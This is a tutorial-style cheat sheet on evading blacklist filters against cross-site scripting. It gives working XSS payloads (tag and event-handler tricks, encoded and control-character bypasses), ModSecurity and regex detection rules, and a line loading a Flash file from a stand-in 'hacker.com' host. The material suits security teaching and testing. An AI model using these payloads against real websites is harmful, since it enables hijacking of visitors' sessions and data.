Blacklisting Filters is the most filter mechanism being used. These type of filter's common goal is to detect specific patterns to prevent malicious behaviors.
## Bypassing Weak `<script>`  Filters.
The `<script>` tag is the primary method to execute JavaScript.

Some filters do not cover all possible cases, making them weak and prone to bypass techniques. The following is an example of few bypasses for weak `<script>` tag filter rules:

| Bypass Payload                               | Description                                                    |
| -------------------------------------------- | -------------------------------------------------------------- |
| `<ScRiPt>alert(1);</ScRiPt>`                 | Mixed of upper and lower-case characters.                      |
| `<ScRiPt>alert(1);`                          | Mixed of upper and lower-case characters, without closing tag. |
| `<script/random>alert(1);</script>`          | Random string after the tag name.                              |
| `<script`<br>`>alert(1);</script>`           | New line after the tag name.                                   |
| `<scr<script>ipt>alert(1);</scr<script>ipt>` | Nested tags.                                                   |
| `<scr\x00ipt>alert(1);</script>`             | NULL bytes.                                                    |
### ModSecurity Filter Rules
The following is an example of how ModSecurity filters the `<script>` tag:
```txt
SecRule ARGS
"(?i)(<script[^>]*>[\s\S]*?<\/script[^>]*>|<script[^>]
*>[\s\S]*?<\/script[[\s\S]]*[\s\S]|<script[^>]*>[\s\S]
*?<\/script[\s]*[\s]|<script[^>]*>[\s\S]*?<\/script|<s
cript[^>]*>[\s\S]*?)"
...[SNIP]...
```
## JavaScript using HTML Attributes
Alternatively, JavaScript can also be executed through the use of HTML attributes, below are some few examples:
- `<a href="javascript:alert(1)">show</a>`
- `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">show</a>`
- `<form action="javascript:alert(1)"><button>send</button></form>`
- `<object data="javascript:alert(1)">`
- `<object data="data:text/html,<script>alert(1)</script>">`
- `<embed code="//hacker.com/xss.swf" allowscriptaccess="always">`
> Note: The `swf` is a defunct Adobe Flash file format. 
## JavaScript using HTML Events
Events are the way that HTML DOM adds interactivity between the website and its visitors.

Almost all event handlers identifier start with `on` and are followed by the name of the event. One of the most used is `onerror`. For example:
```html
<img src=x onerror=alert(1)>
```

Below are some of HTML 4 tag examples:
- `<body onload=alert(1)>`
- `<input type=image src=x:x onerror=alert(1)>`
- `<form oninput=alert(1)><input></form>`
- `<textarea autofocus onfocus=alert(1)>`

While below are some HTML 5 tags examples:
- `<svg onload=alert(1)>`
- `<keygen autofocus onfocus=alert(1)>`
- `<video><source onerror="alert(1)">`
- `<marquee onstart=alert(1)>`
### Filter Rules
The following is a very common regex used to filter all events that start with `on` in order to block this type of payload:
```txt
(on\w+\s*=)
```

However, thanks to a mix of HTML and browser "dynamisms", we can easily bypass this first filter, first example:
- `<svg/onload=alert(1)>`
- `<svg//////onload=alert(1)>`
- `<svg id=x;onload=alert(1)>`

Due to this, the filter has been upgraded to the following, which is more restrictive:
```txt
(?i)([\s\"'`;\/0-9\=]+on\w+\s*=)
```

The following are the bypasses for the second filter, as some browsers convert the control character to a space, thus the `\s` regex rule is not enough to cover all possible characters:
- `<svg onload%09=alert(1)>` (Works on all browsers except Safari)
- `<svg %09onload=alert(1)>`
- `<svg onload%09%20%28%2C%3B=alert(1)>`
- `<svg onload%0B=alert(1)>` (works on IE only)

The following is a list of control characters allowed between the event name attribute (e.g `onload`) and the equal sign character, or just before the event name:
- IExplorer = `0x09`,`0x0B`,`0x0C`,`0x20`,`0x3B`
- Chrome = `0x09`,`0x20`,`0x28`,`0x2C`,`0x3B`
- Safari = `0x2C`,`0x3B`
- FireFox = `0x09`,`0x20`,`0x28`,`0x2C`,`0x3B`
- Opera = `0x09`,`0x20`,`0x2C`,`0x3B`
- Android = `0x09`,`0x20`,`0x28`,`0x2C`,`0x3B`
### Fuzz Testing Filter Rules
Gareth Heyes has created two fuzzer tests:
- [Characters allowed after attribute name](http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name)
- [Characters allowed before attribute name](http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name)